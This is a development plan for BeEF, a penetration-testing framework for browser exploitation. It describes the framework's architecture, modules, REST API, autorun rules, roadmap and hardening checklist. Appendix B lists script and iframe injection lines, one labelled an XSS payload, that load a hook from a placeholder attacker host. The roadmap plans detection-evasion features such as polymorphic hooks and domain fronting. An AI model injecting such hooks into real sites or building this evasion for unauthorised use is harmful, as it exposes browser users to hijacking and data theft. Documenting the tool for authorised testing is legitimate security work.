# BeEF (Browser Exploitation Framework) — Comprehensive Development & Improvement Plan

> **Version:** 0.5.4.0  
> **Last Updated:** 2026-06-10  
> **Purpose:** A living document for AI models, contributors, and maintainers to understand, update, and improve BeEF systematically.

---

## Table of Contents

1. [Project Overview](#1-project-overview)
2. [Architecture Map](#2-architecture-map)
3. [Directory Structure](#3-directory-structure)
4. [Core Subsystems](#4-core-subsystems)
5. [Extension System](#5-extension-system)
6. [Module System](#6-module-system)
7. [REST API Reference](#7-rest-api-reference)
8. [Authentication & Security](#8-authentication--security)
9. [Configuration Reference](#9-configuration-reference)
10. [Database Layer](#10-database-layer)
11. [WebSocket Support](#11-websocket-support)
12. [Autorun Rule Engine (ARE)](#12-autorun-rule-engine-are)
13. [Known Issues & TODOs](#13-known-issues--todos)
14. [Improvement Roadmap](#14-improvement-roadmap)
15. [How to Add a New Module](#15-how-to-add-a-new-module)
16. [How to Add a New Extension](#16-how-to-add-a-new-extension)
17. [How to Add a New REST Endpoint](#17-how-to-add-a-new-rest-endpoint)
18. [Testing Guide](#18-testing-guide)
19. [Deployment & Docker](#19-deployment--docker)
20. [Security Hardening Checklist](#20-security-hardening-checklist)

---

## 1. Project Overview

**BeEF** (Browser Exploitation Framework) is a penetration testing tool focused on web browser exploitation. It allows security professionals to assess the security posture of a target environment using client-side attack vectors.

### Core Capabilities
- **Hook browsers** via a JavaScript payload (`hook.js`) injected into target pages
- **Command & Control** via a web-based Admin UI (`/ui/panel`)
- **RESTful API** for programmatic control of hooked browsers
- **Module system** for executing JavaScript payloads on hooked browsers
- **Extension system** for adding new server-side capabilities
- **Autorun Rule Engine (ARE)** for automated module execution based on browser/OS fingerprinting
- **WebSocket support** for low-latency communication with hooked browsers
- **Metasploit integration** for post-exploitation chaining

### Technology Stack
| Layer | Technology |
|-------|-----------|
| Server | Ruby (Thin/Rack/Sinatra) |
| Database | SQLite3 via ActiveRecord |
| Frontend | ExtJS (Admin UI), vanilla JS (hook) |
| Hook JS | Custom JavaScript (hook.js) |
| Config | YAML |
| Tests | RSpec, Capybara, Selenium |
| Packaging | Bundler (Gemfile) |

---

## 2. Architecture Map

```
┌─────────────────────────────────────────────────────────────────┐
│                        BeEF Server (Thin/Rack)                  │
│                                                                 │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────┐  │
│  │  Admin UI    │  │  REST API    │  │  Hook Handler        │  │
│  │  /ui/*       │  │  /api/*      │  │  /hook.js            │  │
│  │  (ExtJS)     │  │  (Sinatra)   │  │  /init               │  │
│  └──────┬───────┘  └──────┬───────┘  └──────────┬───────────┘  │
│         │                 │                      │              │
│  ┌──────▼─────────────────▼──────────────────────▼───────────┐  │
│  │                   Core Layer                               │  │
│  │  Configuration │ HBManager │ Logger │ Crypto │ Filters    │  │
│  └──────────────────────────┬───────────────────────────────┘  │
│                             │                                   │
│  ┌──────────────────────────▼───────────────────────────────┐  │
│  │                   Database (SQLite3 / ActiveRecord)       │  │
│  │  HookedBrowser │ BrowserDetails │ Command │ Result │ Log  │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │                   Extension System                        │  │
│  │  admin_ui │ network │ proxy │ xssrays │ metasploit │ ...  │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │                   Module System                           │  │
│  │  browser/ │ network/ │ exploits/ │ social_engineering/   │  │
│  └──────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
         ▲                                        ▲
         │  HTTP/WS                               │  HTTP/WS
         ▼                                        ▼
  ┌─────────────┐                        ┌──────────────────┐
  │  Operator   │                        │  Hooked Browsers │
  │  (Browser)  │                        │  (Victims)       │
  └─────────────┘                        └──────────────────┘
```

---

## 3. Directory Structure

```
/vercel/sandbox/                    ← Project root
├── beef                            ← Main executable (Ruby script)
├── config.yaml                     ← Primary configuration file ⭐
├── Gemfile / Gemfile.lock          ← Ruby gem dependencies
├── Rakefile                        ← Rake tasks
├── VERSION                         ← Current version string
├── install                         ← Installation script
├── INSTALL.txt                     ← Installation instructions
├── update-beef                     ← Update script
├── Dockerfile                      ← Docker container definition
├── beef_cert.pem / beef_key.pem    ← Default SSL certs (replace in prod!)
│
├── core/                           ← Core framework code
│   ├── api/                        ← API hook registration system
│   │   ├── main/                   ← Core API event types
│   │   ├── extension.rb            ← Extension API base
│   │   └── module.rb               ← Module API base
│   ├── main/                       ← Main server components
│   │   ├── autorun_engine/         ← ARE (Autorun Rule Engine)
│   │   │   ├── engine.rb           ← Rule matching & execution logic
│   │   │   ├── parser.rb           ← Rule file parser
│   │   │   └── rule_loader.rb      ← Loads rules from arerules/
│   │   ├── client/                 ← Client-side JS generation
│   │   ├── console/                ← Interactive console
│   │   ├── constants/              ← Shared constants
│   │   ├── handlers/               ← HTTP request handlers
│   │   │   ├── modules/            ← JS module handlers (beefjs, command, etc.)
│   │   │   ├── browserdetails.rb   ← /init handler
│   │   │   ├── commands.rb         ← Command polling handler
│   │   │   └── hookedbrowsers.rb   ← hook.js handler
│   │   ├── models/                 ← ActiveRecord models
│   │   │   ├── hookedbrowser.rb    ← Zombie browser model
│   │   │   ├── browserdetails.rb   ← Browser fingerprint data
│   │   │   ├── command.rb          ← Queued commands
│   │   │   ├── result.rb           ← Command results
│   │   │   ├── log.rb              ← Event log
│   │   │   └── rule.rb             ← ARE rules
│   │   ├── network_stack/          ← Network-level handlers
│   │   │   ├── handlers/           ← Dynamic reconstruction, redirector, raw
│   │   │   ├── websocket/          ← WebSocket server
│   │   │   └── assethandler.rb     ← Static asset serving
│   │   ├── rest/                   ← RESTful API
│   │   │   ├── handlers/           ← Per-resource REST handlers
│   │   │   │   ├── admin.rb        ← /api/admin (login/token)
│   │   │   │   ├── hookedbrowsers.rb ← /api/hooks
│   │   │   │   ├── modules.rb      ← /api/modules
│   │   │   │   ├── logs.rb         ← /api/logs
│   │   │   │   ├── categories.rb   ← /api/categories
│   │   │   │   └── server.rb       ← /api/server
│   │   │   └── api.rb              ← REST mount registration + helpers
│   │   ├── router/                 ← Rack routing
│   │   ├── configuration.rb        ← Config loader/accessor ⭐
│   │   ├── server.rb               ← Thin HTTP server setup ⭐
│   │   ├── crypto.rb               ← Token/crypto utilities
│   │   ├── logger.rb               ← Event logger
│   │   └── migration.rb            ← DB migration runner
│   ├── bootstrap.rb                ← Require chain for core
│   ├── filters.rb                  ← Input validation filters
│   ├── hbmanager.rb                ← Hooked Browser manager
│   └── settings.rb                 ← Global settings
│
├── extensions/                     ← Optional server-side extensions
│   ├── admin_ui/                   ← Web-based Admin UI ⭐
│   │   ├── controllers/
│   │   │   ├── authentication/     ← Login/logout logic ⭐
│   │   │   ├── modules/            ← Module execution UI
│   │   │   └── panel/              ← Main panel controller
│   │   ├── media/                  ← Static assets (JS, CSS, images)
│   │   ├── handlers/               ← UI HTTP handlers
│   │   ├── classes/                ← Session, HttpController base
│   │   ├── api/                    ← Extension API hooks
│   │   └── config.yaml             ← Extension config
│   ├── network/                    ← Network discovery modules
│   ├── proxy/                      ← HTTP proxy extension
│   ├── xssrays/                    ← XSS scanning extension
│   ├── metasploit/                 ← Metasploit RPC integration
│   ├── social_engineering/         ← SE attack modules
│   ├── evasion/                    ← JS obfuscation/evasion
│   ├── events/                     ← Event system
│   ├── requester/                  ← HTTP requester
│   ├── dns/                        ← DNS extension
│   ├── dns_rebinding/              ← DNS rebinding attacks
│   ├── webrtc/                     ← WebRTC-based comms
│   └── notifications/              ← Slack/Pushover alerts
│
├── modules/                        ← Client-side attack modules
│   ├── browser/                    ← Browser fingerprinting & attacks
│   ├── network/                    ← Network scanning from browser
│   ├── exploits/                   ← Browser/plugin exploits
│   ├── host/                       ← Host-level attacks
│   ├── social_engineering/         ← Phishing, clickjacking, etc.
│   ├── persistence/                ← Browser persistence techniques
│   ├── misc/                       ← Miscellaneous modules
│   └── debug/                      ← Debug/test modules
│
├── arerules/                       ← Autorun Rule Engine rule files
├── spec/                           ← RSpec test specs
├── test/                           ← Integration/functional tests
├── tools/                          ← Utility scripts
└── doc/                            ← Documentation
```

---

## 4. Core Subsystems

### 4.1 Configuration System (`core/main/configuration.rb`)

The `BeEF::Core::Configuration` class is a hand-rolled singleton that:
- Loads `config.yaml` at startup via `YAML.safe_load`
- Merges extension configs from `extensions/*/config.yaml`
- Merges module configs from `modules/**/config.yaml`
- Provides `get(key)` / `set(key, value)` / `clear(key)` using dot-notation keys

**Key config paths:**
```
beef.credentials.user          ← Admin username
beef.credentials.passwd        ← Admin password
beef.http.host                 ← Bind address (default: 0.0.0.0)
beef.http.port                 ← HTTP port (default: 3000)
beef.http.hook_file            ← Hook JS path (default: /hook.js)
beef.http.https.enable         ← Enable HTTPS
beef.http.websocket.enable     ← Enable WebSocket
beef.restrictions.permitted_ui_subnet   ← IP whitelist for admin
beef.restrictions.permitted_hooking_subnet ← IP whitelist for hooks
beef.api_token                 ← Auto-generated API token (runtime)
beef.extension.*               ← Per-extension config
beef.module.*                  ← Per-module config
```

### 4.2 HTTP Server (`core/main/server.rb`)

- Built on **Thin** (EventMachine-based) + **Rack** + **Sinatra**
- `BeEF::Core::Server` is a singleton
- `mount(url, handler)` registers URL → handler mappings
- `prepare()` sets up all mounts, then creates the Thin server
- `start()` starts the event loop
- SSL/TLS configured via `beef.http.https.*` config keys

### 4.3 Hooked Browser Manager (`core/hbmanager.rb`)

- Tracks all currently hooked browsers (zombies)
- Provides `get_by_id`, `get_by_session` lookups
- Interfaces with `BeEF::Core::Models::HookedBrowser`

### 4.4 Logger (`core/main/logger.rb`)

- `BeEF::Core::Logger.instance.register(type, message)` logs events
- Events stored in `BeEF::Core::Models::Log`
- Types: `Authentication`, `Zombie`, `Command`, etc.

### 4.5 Crypto (`core/main/crypto.rb`)

- Generates secure random tokens for API authentication
- Token length controlled by `beef.crypto_default_value_length`
- API token stored at runtime as `beef.api_token`

### 4.6 Filters (`core/filters.rb`)

- Input validation helpers: `is_valid_ip?`, `is_valid_browserversion?`, etc.
- Used throughout to sanitize user/browser input

---

## 5. Extension System

Extensions add server-side capabilities. Each extension lives in `extensions/<name>/` and has:

| File | Purpose |
|------|---------|
| `config.yaml` | Extension metadata + enable/disable flag |
| `extension.rb` | Main extension module, `extend BeEF::API::Extension` |
| `api/` | API hook registrations |
| `handlers/` | HTTP handlers mounted on the server |
| `controllers/` | Business logic controllers |
| `classes/` | Helper classes |

### Enabled Extensions (default)
| Extension | Path | Purpose |
|-----------|------|---------|
| `admin_ui` | `/ui` | Web-based command & control interface |
| `demos` | `/demos` | Demo pages with hook.js included |
| `events` | internal | Event pub/sub system |
| `requester` | `/api/requester` | HTTP request forwarder |
| `proxy` | internal | HTTP proxy through hooked browser |
| `network` | internal | Network discovery via browser |
| `xssrays` | internal | XSS vulnerability scanner |

### Disabled Extensions (default, enable in config.yaml)
| Extension | Purpose |
|-----------|---------|
| `evasion` | JS obfuscation to evade detection |
| `metasploit` | Metasploit RPC integration |
| `social_engineering` | Phishing/SE attack pages |
| `dns` | DNS server extension |
| `dns_rebinding` | DNS rebinding attack support |
| `webrtc` | WebRTC-based covert channel |
| `notifications` | Slack/Pushover alerting |

---

## 6. Module System

Modules are client-side JavaScript payloads executed on hooked browsers.

### Module Structure
Each module lives in `modules/<category>/<module_name>/`:
```
modules/browser/fingerprint/
├── config.yaml       ← Module metadata (name, category, options)
├── module.rb         ← Server-side Ruby (option definitions, pre/post hooks)
└── command.js        ← Client-side JavaScript payload
```

### Module Categories
| Category | Description |
|----------|-------------|
| `browser` | Browser fingerprinting, cookie theft, history sniffing |
| `network` | Port scanning, host discovery, router attacks |
| `exploits` | Browser/plugin/OS exploits |
| `host` | Webcam, microphone, clipboard access |
| `social_engineering` | Fake dialogs, phishing overlays, clickjacking |
| `persistence` | Evercookie, service workers, tab persistence |
| `misc` | Utilities, beacons, raw JS execution |
| `debug` | Testing and debugging modules |

### Module Execution Flow
1. Operator selects module + options in Admin UI or via REST API
2. Server creates `BeEF::Core::Models::Command` record in DB
3. Hooked browser polls `/command` (XHR) or receives via WebSocket
4. Browser executes `command.js` payload
5. Result POSTed back to server
6. Server stores result in `BeEF::Core::Models::Result`
7. Admin UI displays result

---

## 7. REST API Reference

All REST endpoints require an `?token=<api_token>` query parameter (except `/api/admin/login`).

### Authentication
```
POST /api/admin/login
Body: {"username": "ninja", "password": "kickass22"}
Response: {"success": true, "token": "<api_token>"}
```

### Hooked Browsers
```
GET  /api/hooks                    ← List online/offline hooks
GET  /api/hooks/all                ← All hooks with details
GET  /api/hooks/:session           ← Single hook details
GET  /api/hooks/:session/delete    ← Delete a hook
POST /api/hooks/update/:session    ← Update OS/arch info
```

### Modules
```
GET  /api/modules                  ← List all modules
GET  /api/modules/:id              ← Module details
POST /api/modules/:session/:id     ← Execute module on hook
GET  /api/modules/:session/:id/:cmd_id ← Get command result
```

### Logs
```
GET  /api/logs                     ← All logs
GET  /api/logs/:session            ← Logs for specific hook
```

### Categories
```
GET  /api/categories               ← List module categories
```

### Server
```
GET  /api/server                   ← Server info/status
```

### Autorun Engine
```
GET  /api/autorun                  ← List ARE rules
POST /api/autorun                  ← Create ARE rule
```

---

## 8. Authentication & Security

### Admin UI Authentication
- **File:** `extensions/admin_ui/controllers/authentication/authentication.rb`
- Login via `POST /ui/authentication/login`
- Credentials checked against `beef.credentials.user` / `beef.credentials.passwd` in `config.yaml`
- On success: session cookie set (`beef_session` by default)
- Brute-force protection: `beef.extension.admin_ui.login_fail_delay` timeout between failed attempts
- IP restriction: `beef.restrictions.permitted_ui_subnet`

### REST API Authentication
- **File:** `core/main/rest/handlers/admin.rb`
- Login via `POST /api/admin/login` with JSON body
- Returns `api_token` used for all subsequent API calls
- Token passed as `?token=<value>` query parameter
- IP restriction: `beef.restrictions.permitted_ui_subnet`
- Rate limiting: `beef.restrictions.api_attempt_delay`

### Current Credentials
```yaml
user:   "ninja"
passwd: "kickass22"
```
> ⚠️ **Always change credentials before deployment!**

### Security Features
- Session cookie is `httponly`
- `X-Frame-Options: sameorigin` on all UI responses
- IP subnet whitelisting for both UI and hooking
- Brute-force delay on failed logins
- CSRF nonce validation on logout
- Optional HTTPS with custom cert/key

---

## 9. Configuration Reference

**File:** `config.yaml`

```yaml
beef:
  version: '0.5.4.0'
  debug: false                    # Server-side verbose logging
  client_debug: false             # Client-side verbose logging
  crypto_default_value_length: 80 # API token length

  credentials:
    user:   "ninja"               # ← CHANGE THIS
    passwd: "kickass22"           # ← CHANGE THIS

  restrictions:
    permitted_hooking_subnet:     # Who can be hooked
      - "0.0.0.0/0"
      - "::/0"
    permitted_ui_subnet:          # Who can access admin
      - "0.0.0.0/0"              # ← Restrict in production!
      - "::/0"
    excluded_hooking_subnet: []   # Blacklist
    api_attempt_delay: "0.05"    # Seconds between API attempts

  http:
    debug: false
    host: "0.0.0.0"
    port: "3000"
    xhr_poll_timeout: 1000        # ms between hook polls
    hook_file: "/hook.js"
    hook_session_name: "BEEFHOOK"
    allow_reverse_proxy: false    # Trust X-Forwarded-For
    restful_api:
      allow_cors: false
      cors_allowed_domains: "http://browserhacker.com"
    websocket:
      enable: false
      port: 61985
      secure: true
      secure_port: 61986
      ws_poll_timeout: 5000
      ws_connect_timeout: 500
    web_server_imitation:
      enable: true
      type: "apache"              # apache | iis | nginx
      hook_404: false
      hook_root: false
    https:
      enable: false
      key: "beef_key.pem"
      cert: "beef_cert.pem"

  database:
    file: "beef.db"

  autorun:
    result_poll_interval: 300     # ms
    result_poll_timeout: 5000     # ms
    continue_after_timeout: true

  dns_hostname_lookup: false

  geoip:
    enable: true
    database: '/usr/share/GeoIP/GeoLite2-City.mmdb'

  extension:
    admin_ui:
      enable: true
      base_path: "/ui"
    # ... (see config.yaml for full list)
```

---

## 10. Database Layer

BeEF uses **SQLite3** via **ActiveRecord** (ORM).

### Models

| Model | Table | Description |
|-------|-------|-------------|
| `HookedBrowser` | `hooked_browsers` | Each hooked browser session |
| `BrowserDetails` | `browser_details` | Key-value fingerprint data |
| `Command` | `commands` | Queued/sent module commands |
| `Result` | `results` | Command execution results |
| `Log` | `logs` | Event log entries |
| `Rule` | `rules` | ARE rule definitions |
| `CommandModule` | `command_modules` | Registered module metadata |
| `OptionCache` | `option_caches` | Cached module options |

### Key Fields: `HookedBrowser`
```ruby
id, session, ip, port, firstseen, lastseen
```

### Key Fields: `BrowserDetails`
```ruby
session_id, detail_key, detail_value
```
Common keys: `browser.name`, `browser.version`, `browser.platform`, `host.os.name`, `host.os.version`, `browser.window.uri`, `location.city`, `location.country`

### Migrations
- Located in `core/main/ar-migrations/`
- Run via `BeEF::Core::Migration`

---

## 11. WebSocket Support

- **File:** `core/main/network_stack/websocket/websocket.rb`
- Enabled via `beef.http.websocket.enable: true`
- WS port: `beef.http.websocket.port` (default: 61985)
- WSS port: `beef.http.websocket.secure_port` (default: 61986)
- Uses `em-websocket` gem
- Reduces latency vs XHR polling
- `ws_poll_timeout` controls how often browser checks for commands

---

## 12. Autorun Rule Engine (ARE)

The ARE automatically executes modules on newly hooked browsers based on rules.

### Rule Structure
```yaml
# arerules/example.json
{
  "name": "Rule Name",
  "browser": "FF",              # Browser: FF, C, IE, S, O, ALL
  "browser_version": ">= 40",  # Version condition
  "os": "Linux",               # OS: Windows, Linux, Mac OS X, ALL
  "os_version": "ALL",         # OS version condition
  "modules": [                 # Modules to execute in order
    {
      "name": "get_system_info",
      "condition": null,
      "options": {}
    }
  ],
  "chain_mode": "sequential"   # sequential | nested-forward
}
```

### Chain Modes
- **`sequential`**: Execute modules one after another, regardless of results
- **`nested-forward`**: Pass output of one module as input to the next (async-aware)

### Engine Flow (`core/main/autorun_engine/engine.rb`)
1. New browser hooks → `find_matching_rules_for_zombie()` called
2. Rules matched against browser/OS fingerprint
3. Matching rules trigger `trigger_rule()` → JS wrapper generated
4. JS sent to hooked browser for execution
5. Results polled via `setInterval` (for nested-forward mode)

---

## 13. Known Issues & TODOs

These are extracted from code comments and known limitations:

### Critical / High Priority
- [ ] **`core/main/rest/handlers/admin.rb`**: Comment says `# error 401 unless params[:token] == config.get('beef.api_token')` — token check is commented out with a misleading comment. Verify intent and fix.
- [ ] **`core/main/rest/handlers/hookedbrowsers.rb`**: `error 401` swallowed in requester/xssrays delete blocks — add proper error handling.
- [ ] **ARE Engine**: `# TODO: handle cases where there are multiple ARE rules for the same hooked browser` — no priority/ordering for conflicting rules.
- [ ] **ARE Engine**: OS version normalization broken for Windows 7+ (`# TODO: BUG: This will fail horribly if the target OS is Windows 7 or newer`).
- [ ] **ARE Engine**: `# TODO: This should be updated to support matching multiple OS` in `zombie_os_matches_rule?`.

### Medium Priority
- [ ] **WebSocket online detection**: Hardcoded 15-second threshold in XHR mode (`# Why is it hardcoded 15?`) — should be configurable.
- [ ] **`/api/hooks/:session/delete`**: Returns `error 401` for missing hook — should be `404`.
- [ ] **GeoIP**: Database path hardcoded to `/usr/share/GeoIP/GeoLite2-City.mmdb` — needs better fallback.
- [ ] **SSL cert check**: SHA256 hash comparison for default cert is fragile — use a flag file instead.

### Low Priority
- [ ] **`core/main/rest/handlers/hookedbrowsers.rb`**: `# @todo why is this error swallowed?` in delete handler.
- [ ] **ARE Engine**: `clean_command_body` has a fallback `gsub` that uses wrong quote style.
- [ ] **Admin REST**: `# @todo: this code comment is a lie. why is it here?` in `admin.rb` before block.

---

## 14. Improvement Roadmap

### Phase 1: Security Hardening
1. **Enforce API token on all REST endpoints** — fix the commented-out token check in `admin.rb`
2. **Add CSRF protection** to REST API (currently only logout has nonce check)
3. **Rate limiting** — implement per-IP rate limiting beyond the simple delay
4. **Restrict `permitted_ui_subnet` default** — change from `0.0.0.0/0` to `127.0.0.1/32` in default config
5. **Replace default SSL certs** — add cert generation to install script
6. **Add Content-Security-Policy headers** to Admin UI responses
7. **Implement session expiry** — sessions currently don't expire automatically

### Phase 2: Code Quality
1. **Fix all TODO/BUG comments** listed in Section 13
2. **Add type checking** — migrate to Sorbet or RBS type signatures
3. **Improve error handling** — replace swallowed errors with proper logging
4. **Standardize HTTP status codes** — fix 401 vs 404 misuse
5. **Extract magic numbers** — e.g., hardcoded `15` second timeout
6. **Add input sanitization** to all REST endpoints

### Phase 3: Feature Improvements
1. **WebSocket as default** — make WS the default transport, XHR as fallback
2. **Module result streaming** — stream results in real-time via WebSocket
3. **ARE rule priority** — add priority field to rules for conflict resolution
4. **ARE OS version normalization** — fix Windows 7+ version detection
5. **Multi-user support** — role-based access control (RBAC) for operators
6. **Module sandboxing** — isolate module JS execution
7. **Encrypted database** — SQLCipher for at-rest encryption of beef.db

### Phase 4: Modern Stack Migration
1. **Replace ExtJS Admin UI** — migrate to React/Vue.js for modern UI
2. **Add OpenAPI/Swagger spec** — document all REST endpoints formally
3. **Containerize properly** — multi-stage Docker build, non-root user
4. **Add CI/CD pipeline** — GitHub Actions for automated testing
5. **PostgreSQL support** — add PG as alternative to SQLite for scale
6. **Plugin marketplace** — versioned module/extension distribution

### Phase 5: Detection Evasion
1. **Polymorphic hook.js** — randomize variable names on each serve
2. **Domain fronting support** — route hook traffic through CDNs
3. **Timing jitter** — randomize poll intervals to evade behavioral detection
4. **HTTP/2 support** — add H2 transport option

---

## 15. How to Add a New Module

### Step 1: Create directory
```bash
mkdir -p modules/<category>/<module_name>
```

### Step 2: Create `config.yaml`
```yaml
beef:
    module:
        my_module_name:
            enable: true
            category: "Browser"
            name: "My Module"
            description: "What this module does"
            authors: ["Your Name"]
            target:
                working: ["ALL"]
                not_working: []
            options:
                - name: target_url
                  description: "Target URL"
                  ui_label: "Target URL"
                  value: "http://example.com"
```

### Step 3: Create `module.rb`
```ruby
class Command < BeEF::Core::Command
  def self.options
    [
      { 'name' => 'target_url', 'description' => 'Target URL', 'ui_label' => 'Target URL', 'value' => 'http://example.com' }
    ]
  end

  def post_execute
    content = {}
    content['result'] = @datastore['result'] if @datastore['result']
    save content
  end
end
```

### Step 4: Create `command.js`
```javascript
beef.execute(function() {
    var target = "<%== @target_url %>";
    // Your JavaScript payload here
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=' + encodeURIComponent(target));
});
```

### Step 5: Test
```bash
./beef
# Navigate to Admin UI → select hooked browser → find module → execute
```

---

## 16. How to Add a New Extension

### Step 1: Create directory structure
```bash
mkdir -p extensions/my_extension/{api,handlers,classes}
```

### Step 2: Create `config.yaml`
```yaml
beef:
    extension:
        my_extension:
            enable: false          # Set true to enable
            name: "My Extension"
            description: "What it does"
```

### Step 3: Create `extension.rb`
```ruby
module BeEF
  module Extension
    module MyExtension
      extend BeEF::API::Extension

      @full_name = 'My Extension'
      @short_name = 'my_extension'
      @description = 'What it does'
    end
  end
end

require 'extensions/my_extension/api/handler'
```

### Step 4: Create `api/handler.rb`
```ruby
module BeEF
  module Extension
    module MyExtension
      module API
        class Handler
          def self.mount_handler(server)
            server.mount('/my_extension', BeEF::Extension::MyExtension::Handlers::MyHandler.new)
          end
        end
      end
    end
  end
end

BeEF::API::Registrar.instance.register(
  BeEF::Extension::MyExtension::API::Handler,
  BeEF::API::Server,
  'mount_handler'
)
```

### Step 5: Enable in `config.yaml`
```yaml
extension:
    my_extension:
        enable: true
```

---

## 17. How to Add a New REST Endpoint

### Step 1: Create handler file
```ruby
# core/main/rest/handlers/my_resource.rb
module BeEF
  module Core
    module Rest
      class MyResource < BeEF::Core::Router::Router
        config = BeEF::Core::Configuration.instance

        before do
          error 401 unless params[:token] == config.get('beef.api_token')
          halt 401 unless BeEF::Core::Rest.permitted_source?(request.ip)
          headers 'Content-Type' => 'application/json; charset=UTF-8',
                  'Pragma' => 'no-cache',
                  'Cache-Control' => 'no-cache',
                  'Expires' => '0'
        end

        get '/' do
          { 'data' => 'value' }.to_json
        end

        post '/' do
          request.body.rewind
          data = JSON.parse(request.body.read)
          # process data
          { 'success' => true }.to_json
        rescue StandardError
          error 400
        end
      end
    end
  end
end
```

### Step 2: Register in `core/main/rest/api.rb`
```ruby
module RegisterMyResourceHandler
  def self.mount_handler(server)
    server.mount('/api/myresource', BeEF::Core::Rest::MyResource.new)
  end
end

BeEF::API::Registrar.instance.register(
  BeEF::Core::Rest::RegisterMyResourceHandler,
  BeEF::API::Server,
  'mount_handler'
)
```

### Step 3: Require in `core/bootstrap.rb`
```ruby
require 'core/main/rest/handlers/my_resource'
```

---

## 18. Testing Guide

### Running Tests
```bash
# All specs
bundle exec rspec spec/

# Specific spec file
bundle exec rspec spec/beef/core/configuration_spec.rb

# Integration tests (requires running BeEF instance)
bundle exec rspec test/
```

### Test Structure
```
spec/
├── beef/
│   ├── core/
│   │   ├── configuration_spec.rb
│   │   ├── filters_spec.rb
│   │   └── ...
│   └── extensions/
│       └── admin_ui/
└── spec_helper.rb

test/
├── integration/
└── functional/
```

### Writing a New Spec
```ruby
# spec/beef/core/my_feature_spec.rb
require 'spec_helper'

describe BeEF::Core::MyFeature do
  before(:each) do
    # setup
  end

  it 'does something' do
    expect(subject.method).to eq(expected_value)
  end
end
```

### Manual API Testing
```bash
# 1. Start BeEF
./beef

# 2. Get API token
TOKEN=$(curl -s -X POST http://127.0.0.1:3000/api/admin/login \
  -H "Content-Type: application/json" \
  -d '{"username":"ninja","password":"kickass22"}' | jq -r '.token')

# 3. List hooked browsers
curl "http://127.0.0.1:3000/api/hooks?token=$TOKEN"

# 4. Execute a module (replace SESSION and MODULE_ID)
curl -X POST "http://127.0.0.1:3000/api/modules/SESSION/MODULE_ID?token=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"wait": 5}'
```

---

## 19. Deployment & Docker

### Docker Build & Run
```bash
# Build
docker build -t beef .

# Run (development)
docker run -p 3000:3000 -p 61985:61985 beef

# Run (production with custom config)
docker run -p 3000:3000 \
  -v /path/to/config.yaml:/beef/config.yaml \
  -v /path/to/certs:/beef/certs \
  beef
```

### Production Checklist
- [ ] Change `beef.credentials.user` and `beef.credentials.passwd`
- [ ] Restrict `beef.restrictions.permitted_ui_subnet` to operator IPs only
- [ ] Enable HTTPS (`beef.http.https.enable: true`) with valid cert
- [ ] Generate new SSL cert: `tools/generate-certificate`
- [ ] Set `beef.http.allow_reverse_proxy: true` only if behind a trusted proxy
- [ ] Consider enabling WebSocket for better performance
- [ ] Disable unused extensions
- [ ] Set `beef.debug: false` and `beef.client_debug: false`
- [ ] Run as non-root user
- [ ] Use a firewall to restrict port 3000 access

### Reverse Proxy (nginx example)
```nginx
server {
    listen 443 ssl;
    server_name beef.example.com;

    ssl_certificate /etc/ssl/beef.crt;
    ssl_certificate_key /etc/ssl/beef.key;

    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_set_header X-Forwarded-For $remote_addr;
        proxy_set_header Host $host;
    }
}
```
> Set `beef.http.allow_reverse_proxy: true` when using a reverse proxy.

---

## 20. Security Hardening Checklist

### Before Any Deployment
- [ ] **Change default credentials** — never use `ninja`/`kickass22` in production
- [ ] **Restrict admin subnet** — set `permitted_ui_subnet` to specific IPs
- [ ] **Enable HTTPS** — use a valid, non-default SSL certificate
- [ ] **Rotate API token** — token is generated at startup; restart to rotate
- [ ] **Disable debug mode** — `beef.debug: false`, `beef.client_debug: false`
- [ ] **Review enabled extensions** — disable anything not needed
- [ ] **Firewall rules** — only expose ports to authorized operators
- [ ] **Log monitoring** — monitor BeEF logs for unauthorized access attempts
- [ ] **Database security** — restrict file permissions on `beef.db`
- [ ] **Update dependencies** — run `bundle update` and review changelogs

### Operational Security
- [ ] Use BeEF only on systems you own or have explicit written permission to test
- [ ] Keep BeEF behind a VPN or SSH tunnel when possible
- [ ] Rotate credentials after each engagement
- [ ] Wipe `beef.db` between engagements
- [ ] Use the `excluded_hooking_subnet` to prevent accidental hooking of internal systems

---

## Appendix A: Quick Reference Commands

```bash
# Start BeEF
./beef

# Start with custom config
./beef -c /path/to/custom_config.yaml

# Start with debug
./beef --debug

# Update BeEF
./update-beef

# Install dependencies
./install

# Run tests
bundle exec rspec spec/

# Generate SSL certificate
ruby tools/generate-certificate/generate-certificate.rb
```

## Appendix B: Hook Injection Examples

```html
<!-- Basic hook injection -->
<script src="http://BEEF_HOST:3000/hook.js"></script>

<!-- Via XSS payload -->
<script src=http://BEEF_HOST:3000/hook.js></script>

<!-- Via iframe -->
<iframe src="http://BEEF_HOST:3000/demos/basic.html"></iframe>
```

## Appendix C: Useful Log Locations

| Log | Location |
|-----|---------|
| BeEF event log | Admin UI → Logs tab, or `GET /api/logs?token=TOKEN` |
| Database | `beef.db` (SQLite, in project root) |
| Server stdout | Terminal running `./beef` |

---

*This PLAN.md is intended to be updated as the codebase evolves. AI models improving BeEF should update the relevant sections after making changes.*
